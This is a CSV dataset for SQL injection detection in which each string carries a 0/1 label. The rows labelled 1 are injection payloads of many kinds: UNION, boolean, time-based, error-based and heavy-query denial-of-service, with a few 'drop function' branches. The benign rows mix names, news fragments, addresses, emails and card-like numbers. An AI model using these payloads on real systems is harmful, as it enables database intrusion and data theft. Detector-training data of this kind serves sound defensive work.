Sentence,Label
estafetil,0
 Here speed coordination order day ,0
" According message shared airport management via twitter , incident began 9",0
misaki-saks@estoeslahostia.gy,0
1' where 7036 = 7036,1
"plaza hernan cortes 199, 4f",0
90r2l,0
"-6086"" union all select 8700,8700,8700,8700--",1
"-1166'  )  )   as icdz where 1042 = 1042 union all select 1042,1042,1042,1042,1042#",1
9079098959660122,0
p6lma13isti,0
1595247568175334,0
91800426c,0
1 )  and 7533 = 7533,1
20200,0
" Late Thursday evening , fire broke ground floor house ",0
"1'  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and 'fsvr' = 'fsvr",1
"1'  )  )   as icik where 1440 = 1440 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
quebrador,0
3720111017724174,0
"-3933'  )  )   )  union all select 6198,6198,6198,6198,6198#",1
cuervo1,0
colkins_comb@autobuses-hibridos.mg,0
nineteen@drivinn.int,0
" select * from users where id = '1' union select $*$,@@VERSION -- 1'",1
"-1908"" )  where 6420 = 6420 union all select 6420,6420,6420,6420--",1
somisett,0
 Standard automatic speech recognizers output unstructured streams words,0
"c/ julia minguillon, 179, 7-a",0
09260,0
1' )  as nexa where 6740 = 6740,1
46909856e,0
3581922362739971,0
ninnette,0
5218,0
10131,0
"1"" and make_set ( 4214 = 9503,9503 )  and ""phjg"" like ""phjg",1
spence,0
bucardo,0
"1' )  as jwvp where 5231 = 5231 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
myhers@wave.com.so,0
"1'  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'rdpv' = 'rdpv",1
bienvenido,0
1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'ljhc' = 'ljhc,1
1'+ ( select 'hjku' where 1954 = 1954 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  +',1
"1%"" or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""%"" = """,1
"1'+ ( select hspl where 4530 = 4530 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
saciedad,0
"-9532  )  )   union all select 6039,6039,6039,6039--",1
arres,0
34829,0
-9148 )  where 2027 = 2027 or 8571 = 8571--,1
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",1
waitfor delay '0:0:5' and  ( 'gpqx' like 'gpqx,1
1  )  )   and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  1260 = 1260,1
"1"" )  where 4905 = 4905 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
lanae,0
castell de rugat,0
gdowik2,0
58 barrel ICE exchange London ,0
brace4@velazquezlarraaga.kz,0
if ( 8574 = 7534 )  select 8574 else drop function nxbe--,1
1'|| ( select 'scct' where 2587 = 2587 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  ||',1
guadalajara,0
"1', ( select  ( case when  ( 8382 = 8382 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
theo,0
"-1238' )  as lxur where 7075 = 7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",1
enaciado,0
procacci,0
"-8258""  )  )   as swjp where 2681 = 2681 union all select 2681,2681,2681,2681,2681,2681--",1
1%'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( '%' = ',1
jarvis-wassmann@classroommanager.pe,0
oleilnikov_balasko@hostprofessional.ac,0
"santa agueda 54, 1?c",0
conesa,0
" select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",1
"c/ portal de zamudio 65,",0
"1""  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""ampn"" like ""ampn",1
spnola ballado,0
"1%"" )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( ""%"" = """,1
"1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( 'qdhz' = 'qdhz",1
"1%"" )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
robeling.colmar8@diagnosticoradiologico.nf,0
" In particular , planned major investments , debts thus affect parishes , cause great concern ",0
"1 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # hlrg",1
-9522 )  as lraw where 9472 = 9472 or  ( 4087 = 8213 ) *8213--,1
9051495468288465,0
9842153778086197,0
18858,0
mallku,0
"1"" )  where 3826 = 3826",1
1'+ ( select iutk where 6158 = 6158,1
1' or sleep ( 5 ) #,1
"valencia, 79 12?h",0
-9264' )  or 8571 = 8571--,1
koczian@decoaching.is,0
casabermeja,0
-7636' )  or 5898 = 8880 and  ( 'sjuv' = 'sjuv,1
remington,0
funston8,0
socorro,0
14962243f,0
-2036' )  or  ( 8459 = 8459 ) *4906 and  ( 'hjeu' = 'hjeu,1
1'|| ( select 'ozoj' where 1608 = 1608,1
if ( 5316 = 4416 )  select 5316 else drop function vtve--,1
zanobia,0
"tercio de napolitanos, 104 4-b",0
44392621e,0
"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
b9rl5ingar,0
rix.piljeckaja@waterflyesp.be,0
"1'|| ( select 'jpso' from dual where 9357 = 9357 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",1
1503380912783621,0
"moraira 185,",0
" These included Philipp Pangerl , semi-professional mountain biker Black Tusk Racing Team ",0
7208320116493837,0
9782,0
robadora,0
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'peyy' = 'peyy",1
46470,0
baxevanos@clubdeviaje.fk,0
"calle jose espejo, 130, 12?a",0
"1 )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
"1 where 6040 = 6040 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
lamarr@tardos.mobi,0
if ( 4947 = 5350 )  select 4947 else drop function ereg--,1
"1%'  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( '%' = '",1
"1' )  as ywtu where 3009 = 3009 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1%"" )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""%"" = """,1
"-1048%"" or 3038 = 3038",1
" To get 20 years , killing 202 people injuring many hundreds , &apos;s much ",0
"1  )  )   )  union all select null,null,null,null,null,null,null,null--",1
"1""  )  )   as ecnn where 8913 = 8913 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
"1""  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""dbxi"" like ""dbxi",1
"-2382%' )  union all select 8885,8885,8885,8885,8885,8885,8885#",1
raif,0
puigmitj del molino,0
 respectively ,0
""" or pg_sleep ( __TIME__ ) --",1
41909752a,0
" The old man , Santiago , best comes fishing ",0
-5470'  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  'oeam' = 'oeam,1
iamele pedrouzo,0
-9358' or 9887 = 2569--,1
"-9587 union all select 1568,1568,1568,1568,1568,1568#",1
1' and 7533 = 7533 and 'frvk' = 'frvk,1
byoung,0
calle teniente bragado 139 7?e,0
 50 grams apple sauce tablespoon ground linseed plus three tablespoons water also suitable ,0
gata,0
1' )  as jwch where 4609 = 4609,1
"1""  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( ""ijag"" = ""ijag",1
"-3082"" )  where 1082 = 1082 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
"-2325'  )  )   )  union all select 1442,1442,1442--",1
-9975 where 9760 = 9760 order by 1--,1
des9o89451rac28,0
"1  )  )   as dnwj where 2961 = 2961 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
3632,0
tro8e0e1!0,0
44322044d,0
86475524d,0
myranda,0
fedro,0
1' in boolean mode )  and 4595 = 4595#,1
perarra,0
cabot camaran,0
select  ( case when  ( 5847 = 2826 )  then 5847 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
 A single dose vaccine able protect mice nicotine addiction life ,0
38656027l,0
*r6t58a,0
" As Managing Director municipal energy company , Jörg-Arne Bias , confirmed SÜDKURIER , families four Pfullendorf receiving end price increase EUR 70 90 per year ",0
" select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",1
venita,0
1' where 6359 = 6359 and  ( 3020 = 3020 ) *6703--,1
t0t0,0
cabal urrupan,0
"-4085'+ ( select aipn where 5493 = 5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1
"c/ misericordia, 57 7-h",0
36432557m,0
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",1
pablo,0
7591,0
ch61c795,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  'zaru' = 'zaru",1
amenta,0
" select sleep ( 5 )  and   (  (   ( ""uvzc"" like ""uvzc",1
"1' )  as hvyx where 3194 = 3194 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
62257757t,0
8993572479681564,0
olaya,0
" Some bankers tried play affair saying vast highly liquid foreign exchange market almost impossible manipulate , senior traders saying necessarily true ",0
207,0
wackers_donlin@gesautonomos.bh,0
" select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
"1  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  5336 = 5336",1
" select sleep ( 5 )  and   (  (   ( ""%"" = """,1
8mp3n436lar,0
orera,0
08282,0
kenta1,0
4148689549974834,0
2080,0
salinas de oro,0
1' or sleep ( 5 ) ,1
c/ david 169 6-h,0
"calle cua, 34",0
17493,0
10303147k,0
80135646n,0
8409,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'ekhi' = 'ekhi",1
gianina,0
5881598906156737,0
dreyfuss6,0
el-hawar,0
" Obvious signs development , budding breasts , pubic underarm hair body odor appearing sooner girls ",0
xixia,0
" They intersex , part group 60 conditions fall diagnosis disorders sexual development , umbrella term atypical chromosomes , gonads (ovaries testes), unusually developed genitalia ",0
1'  )  )   as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,1
morea,0
de lagarza delacerda,0
05208723m,0
blanquer,0
romberg,0
"1""  )  )   and sleep ( 5 ) #",1
"1' )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'lwlh' = 'lwlh",1
1' )  where 5286 = 5286,1
adriel,0
e6tal1g68,0
" Are people stupid take bags home throw nearest rubbish bin ? After , waste paper spoil landscape ",0
1'  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  'glfq' like 'glfq,1
"-8893 )  union all select 7594,7594,7594,7594,7594,7594#",1
" Girls blossom early need reassurance , even happens ahead schedule , process normal part life ",0
1346877489776313,0
3549373062406547,0
moraine@tintaultravioleta.tr,0
27236120a,0
02614,0
 )  union select * from information_schema.tables;,1
transito de entrerruas 146 1-e,0
"1%' )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( '%' = '",1
calle rioja 147,0
"1' or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'scye' like 'scye",1
beckwith,0
abdul,0
1' )  as sagj where 4558 = 4558,1
1%' and 7366 = 9197#,1
"1 where 8908 = 8908 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
 But next creation set even ambitious ,0
46704601l,0
"1"" where 9889 = 9889",1
"1"" rlike  ( select  ( case when  ( 3711 = 3313 )  then 1 else 0x28 end  )  )   and ""iqlh"" like ""iqlh",1
rochas comamala,0
"1"" )  where 9086 = 9086 or sleep ( 5 ) #",1
retr8t2,0
"1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
amsterdam@mailboxrussia.nz,0
" select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1
c/ virgen de begoa 43,0
" Within companies , administrators often able read electronic mail sent ",0
pozal de gallinas,0
"1"" )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( ""tgdu"" = ""tgdu",1
hache6,0
calle tresmall 154,0
keast@comodepilarse.si,0
peredo huecas,0
8747300653660135,0
' or ''^',1
fogars de la selva,0
" In , collided BMW 23-year-old Konstanz resident , travelling lane ",0
"1'+ ( select eztr where 4260 = 4260 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5  )  )  +'",1
"calle andres mellado, 83, 12-d",0
tamer,0
" In addition , providers check whether nuisance unwanted spam mail , deleted immediately least sorted spam folder ",0
7774409448573763,0
05296,0
vinasco pomar,0
"1"" where 1719 = 1719 and 7533 = 7533--",1
0338196248842458,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  ""%"" = """,1
dotty,0
leonelo,0
1'+ ( select basp where 6953 = 6953,1
canal saracho,0
"-8609%""  )  )   )  union all select 6021,6021,6021,6021,6021,6021--",1
"jabeque, 86,",0
"-4056""  )  )   )  union all select 4363,4363,4363,4363,4363,4363,4363,4363#",1
-5820'  )  )   as lkik where 4044 = 4044 or 7156 = 9197--,1
pugliesi boleda,0
kovacs,0
" select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
keep_theberge9@aprendeaestudiar.gr,0
"grup de la pau, 108,",0
"1' )  union all select null,null,null,null,null,null#",1
edmunds.emil@carimartin.io,0
d2s7sp79ro,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""squx"" like ""squx",1
sala ripoli,0
chinaphan@viajesdacapalla.eh,0
1 where 2384 = 2384 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
select pg_sleep ( 5  )  )  ||',1
t45r97car,0
"-7350'  )  )   )  union all select 9207,9207,9207,9207--",1
3580665595349534,0
03291016s,0
alonso,0
"1' )  where 4407 = 4407 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
descabal!gadura,0
69409914p,0
43,0
select  ( case when  ( 2751 = 8206 )  then 2751 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"1""  )  )   as maxe where 5883 = 5883 union all select null,null,null,null,null,null,null,null,null#",1
masooda,0
2546840770409858,0
"-8200' where 3422 = 3422 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
select  ( case when  ( 2968 = 2021 )  then 1 else 2968* ( select 2968 from master..sysdatabases )  end ) --,1
ga7bn,0
corcoy augu,0
1477,0
bestard,0
s!u2cep7ivo,0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"umbria, 143,",0
18iangu7ada,0
"c/ violeta, s/n 9-b",0
1'|| ( select 'awba' from dual where 3749 = 3749 and 1445 = 3334--,1
"1'|| ( select 'votg' where 5105 = 5105 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1"" )  where 3404 = 3404 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
rhetta,0
"1 where 3410 = 3410 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
" &quot; I find wonderful America , myth folklore already part education , &quot; said ",0
15398407e,0
11300,0
84082482w,0
"c/ la estrella, 182",0
 The situation &apos;t changed much since Bwelle &apos;s father passed away 2002 ,0
" select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1
casarabonela,0
6ong6,0
"pl. juan de antxieta, 191, 13?g",0
28045405x,0
1' )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1
calomee.mirren1@nuestrasantacruz.bj,0
"1"" )  as piwi where 2918 = 2918",1
 Reports US National Security Agency spied Brazilian oil company Petrobras gained access data held US cloud providers including Google Yahoo ratcheted corporate paranoia state surveillance new highs ,0
servidio,0
carre mamani,0
pascuala,0
"c/ doctor pablos abril 156, 5?f",0
select  ( case when  ( 3217 = 8421 )  then 3217 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"1' or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and 'vgro' like 'vgro",1
-8095' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1
" Saying many myths would &quot; far wild , far scandalous cases far filthy taught schools , &quot; Crossley-Holland advocated &quot; careful selection &quot; age-appropriate works ",0
45478096n,0
3549,0
"travesia magdalena, 53 4?g",0
6759860992373102,0
"1'|| ( select 'epjr' from dual where 3074 = 3074 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
48p81o0oo,0
' )  or true--,1
8ap6l4984,0
1%' and sleep ( 5 ) #,1
7984505831107491,0
"-6108' )  union all select 2519,2519,2519,2519--",1
gorr!n,0
"-5928""  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  ""rggt"" like ""rggt",1
 But Dr,0
dalmaus estrada,0
sayara,0
mangot barra,0
" The darker meat , higher pH value ",0
"1' )  as ezoa where 4915 = 4915 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-8436' )  as frmf where 7225 = 7225 or make_set ( 9354 = 9354,7185 ) --",1
martens,0
o.neil,0
"1' )  as irsh where 4973 = 4973 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
24244793x,0
allegra,0
santo,0
"1  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 9802 = 9802",1
boykin@cienciapolicial.gr,0
constantemente,0
16216,0
t31331,0
zangn,0
-1385'  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( 'mjjd' = 'mjjd,1
" At Metropolitan Transportation Commission San Francisco Bay Area , officials say Congress could simply deal bankrupt Highway Trust Fund raising gas taxes ",0
1'+ ( select ankx where 6789 = 6789,1
verge,0
petronil,0
albercoque,0
woodworth_balchowsky@faders.com.bf,0
aarn,0
tenesaca chaves,0
r2s058ada,0
 The Commander expressed satisfaction following exercise ,0
-9660  )  )   or 9762 = 9698,1
unzaga gomariz,0
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1
8167,0
osarte caella,0
cabieces amayuela,0
1'+ ( select 'uqaf' where 7414 = 7414,1
" &apos; It &apos;s five years later , Mr",0
" Taking stage men women smart bowler hats , tipped flat cap jaunty angle paraded two-year-old Toffee around ring ",0
queral queral,0
kelcy,0
2783,0
donovan,0
ciclotimia,0
shazmin,0
-3688'|| ( select 'pber' from dual where 7137 = 7137 order by 1#,1
"calle conjunto avenida, 116",0
v8s684t29a,0
ca61u13ia-0,0
fabricia,0
6417632466491788,0
"paraje antonio de nebrija 39,",0
mendavia,0
demren,0
ros,0
"-6534%'  )  )   or make_set ( 4107 = 9457,9457 )  and   (  (  '%' = '",1
09228,0
montvez zurita,0
"1' or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
23710,0
"calle valdibaez 185,",0
e7c5c1da,0
" &quot; At least post boxes districts Neuschloß Rosengarten must still emptied Sundays , &quot; said Bittner Röhrenbeck unison ",0
ladi,0
almorejo,0
select  ( case when  ( 3140 = 4625 )  then 1 else 3140* ( select 3140 from master..sysdatabases )  end ) --,1
9009008887787551,0
82311327p,0
"1%"" )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( ""%"" = """,1
"1' )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'zspf' = 'zspf",1
 Politicians expressed concern EU lacks certain IT internet capabilities strive reduce dependence US ,0
""" )  or true--",1
1  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 8023 = 8023,1
"calle cortafell, 74",0
banerjee6@getgold.ec,0
01218498g,0
"joyosa, la",0
underwoo,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) -- vhmc",1
" After test plane &apos;s inaugural flight month half ago , flown three times , raising questions whether testing phase track ",0
albegar,0
sant quirze de besora,0
postrar,0
venialbo,0
nazareno,0
"de los cazadores, 196, 1-b",0
49317901j,0
alar1ado0,0
"1"" )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1
solter@aclub.com.ke,0
go1mador,0
"1""  )  )   as jucs where 6836 = 6836",1
02056001p,0
antanas,0
kennie,0
lara,0
pankiw,0
souther,0
ojs,0
56546514w,0
rossy,0
" The so-called &apos; German Mass &apos; , original title &quot; Gesänge zur Feier des heiliges Opfers der Messe &quot; (Songs celebrate holy sacrifice mass), D 872 , spiritual work composer Franz Schubert , dating 1826 , time written considered almost revolutionary ",0
cgi 2& 20 20003 2017 201704/00001491382788757,0
conrado,0
59di51ca1,0
06966107m,0
"avinguda gabriel alomar i villalonga, 20 6?a",0
9159,0
inusitado,0
"-3443""  )  )   union all select 4043,4043,4043,4043,4043,4043,4043#",1
ibdes,0
S,0
cao,0
monserrat,0
verschuer_greenleaf@cajucar.cx,0
ana,0
1755897947554799,0
rubor,0
"1"" or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
kareem,0
2116,0
"1', ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select 1 from generate_series ( 8979,8979,case when  ( 8979 = 8979 )  then 1 else 0 end )  limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )  ",1
chinarro,0
32633,0
 At around 2,0
rivalee,0
-8486%'  )  )   )  or 8571 = 8571--,1
roelos de sayago,0
"1""  )  )   )  and sleep ( 5 )  and   (  (   ( ""fdvc"" like ""fdvc",1
"1'  )  )   )  union all select null,null,null,null,null,null--",1
"1""  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (   ( ""uncg"" = ""uncg",1
"1 )  as guru where 7615 = 7615 union all select null,null,null,null,null,null,null,null,null,null#",1
" For Bwelle , near-constant workload &apos;t hardship ",0
58743816e,0
